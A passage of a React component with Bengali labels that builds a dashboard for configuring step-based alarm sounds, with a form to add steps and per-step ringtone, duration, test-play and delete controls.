      <div className="xl:col-span-5 flex flex-col gap-6 sm:p-2">
        {/* Dynamic Add New Tong / Step Form */}
        <div className="bg-[#121215]/90 border border-zinc-850 p-6 rounded-3xl shadow-2xl">
          <div className="flex items-center justify-between mb-4 pb-2 border-b border-zinc-850">
            <h3 className="text-sm font-bold text-zinc-150 flex items-center gap-2">
              <SmartphoneIcon className="w-4 h-4 text-amber-500" />
              ➕ নতুন অ্যালার্ম টং (ধাপ) যোগ করুন
            </h3>
            <button 
              onClick={resetTongsToDefault}
              className="text-[10px] text-red-400 hover:text-red-300 bg-red-950/20 px-2 py-1 rounded border border-red-900/40 hover:bg-red-900/20 active:scale-95 transition-all cursor-pointer font-bold"
              title="রিসেট করে ডিফল্ট অবস্থানে ফিরুন"
            >
              🔄 রিসেট
            </button>
          </div>

          <form onSubmit={addTong} className="space-y-3.5 text-xs text-left">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              <div className="flex flex-col gap-1.5">
                <label className="text-zinc-400 font-medium">ধাপ নম্বর (Step ID):</label>
                <input
                  type="number"
                  min="0"
                  max="99"
                  required
                  value={newStepNum}
                  onChange={(e) => setNewStepNum(Number(e.target.value))}
                  className="w-full bg-zinc-950 border border-zinc-850 rounded-xl px-3 py-2 text-white outline-none focus:border-amber-500 font-mono"
                  placeholder="যেমনঃ ৫"
                />
              </div>

              <div className="flex flex-col gap-1.5">
                <label className="text-zinc-400 font-medium">অ্যালার্মের সুর (Ringtone):</label>
                <select
                  value={newSoundType}
                  onChange={(e) => setNewSoundType(e.target.value as any)}
                  className="w-full bg-zinc-950 border border-zinc-850 rounded-xl px-3 py-2 text-zinc-300 outline-none focus:border-amber-500 font-mono"
                >
                  <option value="SOFT_CHIME">Soft Chime (🎵)</option>
                  <option value="PHONE_RINGTONE">Phone Ringtone (☎️)</option>
                  <option value="DIGITAL_BEEP">Digital Beep (🚨)</option>
                </select>
              </div>
            </div>

            <div className="flex flex-col gap-1.5">
              <label className="text-zinc-400 font-medium">ধাপের বিবরণ / বড় টাইটেল:</label>
              <input
                type="text"
                required
                value={newTitle}
                onChange={(e) => setNewTitle(e.target.value)}
                className="w-full bg-zinc-950 border border-zinc-850 rounded-xl px-3 py-2 text-white outline-none focus:border-amber-500"
                placeholder="যেমনঃ ধাপ ৫: ওটিপি কোড পুনরায় পাঠানো হয়েছে"
              />
            </div>

            <div className="flex flex-col gap-1.5 bg-zinc-950/40 p-3.5 rounded-2xl border border-zinc-900/60">
              <div className="flex justify-between items-center mb-1">
                <label className="text-zinc-400 font-medium">এই ধাপে অ্যালার্ম বাজার স্থায়িত্ব (Duration Seconds):</label>
                <span className="text-amber-400 font-bold font-mono bg-amber-950/30 px-2.5 py-0.5 rounded-full border border-amber-900/20">{newDuration} সেকেন্ড</span>
              </div>
              <input
                type="range"
                min="2"
                max="60"
                value={newDuration}
                onChange={(e) => setNewDuration(Number(e.target.value))}
                className="w-full h-1.5 bg-zinc-900 rounded-lg appearance-none cursor-pointer accent-amber-500"
              />
              <div className="flex justify-between text-[9px] text-zinc-500">
                <span>০২ সেঃ</span>
                <span>৩০ সেঃ</span>
                <span>৬০ সেঃ</span>
              </div>
            </div>

            <button
              type="submit"
              className="w-full bg-gradient-to-r from-[#c5a059] to-amber-500 hover:from-amber-500 hover:to-amber-600 border border-amber-600/20 text-black font-bold py-2.5 px-4 rounded-xl active:scale-[0.98] transition-all cursor-pointer shadow-lg shadow-amber-500/10 flex items-center justify-center gap-2"
            >
              <span>➕ অ্যালার্ম ধাপ তালিকায় যুক্ত করুন</span>
            </button>
          </form>
        </div>

        {/* Master Active Configs Control with adjustable Duration & Delete option */}
        <div className="bg-[#121215]/90 border border-zinc-850 p-6 rounded-3xl shadow-2xl flex-1 flex flex-col">
          <h3 className="text-sm font-bold text-zinc-150 mb-4 pb-2 border-b border-zinc-850 flex items-center gap-2">
            <Volume2 className="w-4 h-4 text-[#c5a059]" />
            🎯 অ্যালার্ম টং ড্যাশবোর্ড (কাস্টম টাইম ও ডিলিট করুন)
          </h3>

          <div className="flex-1 overflow-y-auto max-h-[460px] flex flex-col gap-3.5 pr-1 no-scrollbar text-left text-xs">
            {tongs.length === 0 ? (
              <div className="py-8 text-center text-zinc-500">
                <p>কোনো অ্যালার্ম হুক সংরক্ষিত নেই।</p>
                <p className="text-[11px] text-zinc-650 mt-1">রিসেট বাটন চেপে পুনরায় ডিফল্ট হুকগুলো ফিরিয়ে আনতে পারেন।</p>
              </div>
            ) : (
              tongs.map((tong) => (
                <div key={tong.step} className="p-4 rounded-2xl bg-zinc-950/60 border border-zinc-900/80 hover:border-zinc-800 transition-all flex flex-col gap-2.5">
                  <div className="flex justify-between items-start gap-2">
                    <div className="flex items-center gap-2 bg-zinc-900/90 px-3 py-1 rounded-xl border border-zinc-850">
                      <span className="text-[11px] font-mono font-bold text-amber-400">ধাপ {tong.step}</span>
                    </div>

                    <div className="flex items-center gap-2">
                      <span className={`text-[9px] px-2 py-0.5 rounded-full font-bold ${tong.isActive ? 'bg-emerald-950/40 text-emerald-400 border border-emerald-900/35' : 'bg-zinc-900 text-zinc-500 border border-zinc-800'}`}>
                        {tong.isActive ? 'সক্রিয়' : 'বন্ধ'}
                      </span>
                      <button
                        onClick={() => deleteTong(tong.step)}
                        className="text-red-400 hover:text-red-300 hover:bg-red-950/30 p-1.5 rounded-xl border border-transparent hover:border-red-900/40 transition-all cursor-pointer active:scale-90"
                        title="ডিলিট করুন"
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>
                    </div>
                  </div>

                  <p className="text-[12px] font-bold text-zinc-200">{getStepTitleText(tong)}</p>

                  <div className="grid grid-cols-1 md:grid-cols-4 gap-2.5 items-center border-t border-zinc-900/80 pt-2.5 mt-1">
                    {/* RingTone selector */}
                    <div className="md:col-span-2">
                      <select
                        value={tong.type}
                        onChange={(e) => changeTongType(tong.step, e.target.value as any)}
                        className="w-full bg-zinc-900 border border-zinc-800 text-[11px] text-zinc-300 rounded-lg py-1 px-1.5 outline-none font-mono"
                      >
                        <option value="SOFT_CHIME">Soft Chime</option>
                        <option value="PHONE_RINGTONE">Phone Ringtone</option>
                        <option value="DIGITAL_BEEP">Digital Beep</option>
                      </select>
                    </div>

                    {/* Play test button */}
                    <div className="md:col-span-2 flex items-center justify-end gap-1.5">
                      <button
                        onClick={() => handleTestSound(tong.type, tong.durationSeconds ?? alarmDuration)}
                        className="flex-1 text-center bg-zinc-900 hover:bg-zinc-850 text-blue-400 border border-zinc-800 py-1 px-2.5 rounded-lg text-[10px] font-bold active:scale-95 transition-all cursor-pointer"
                      >
                        🔊 বাজান
                      </button>
                      <button
                        onClick={handleStopSound}
                        className="bg-zinc-900 hover:bg-zinc-850 text-zinc-500 hover:text-zinc-300 border border-zinc-800 py-1 px-1.5 rounded-lg active:scale-95 transition-all cursor-pointer"
                        title="স্টপ"
                      >
                        ⏹️
                      </button>
                    </div>
                  </div>

                  {/* Personal Step Duration slider */}
                  <div className="flex flex-col gap-1 mt-1 bg-zinc-900/40 p-2.5 rounded-xl border border-zinc-900/50">
                    <div className="flex justify-between text-[10px] text-zinc-400">
                      <span>অ্যালার্ম রিং স্থায়িত্ব:</span>
                      <span className="font-mono font-bold text-amber-400">{tong.durationSeconds ?? alarmDuration} সেকেন্ড</span>
                    </div>
                    <input
                      type="range"
                      min="1"
                      max="60"
                      value={tong.durationSeconds ?? alarmDuration}
                      onChange={(e) => changeTongDuration(tong.step, Number(e.target.value))}
                      className="w-full h-1 bg-zinc-800 rounded-lg appearance-none cursor-pointer accent-amber-500"
                    />
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
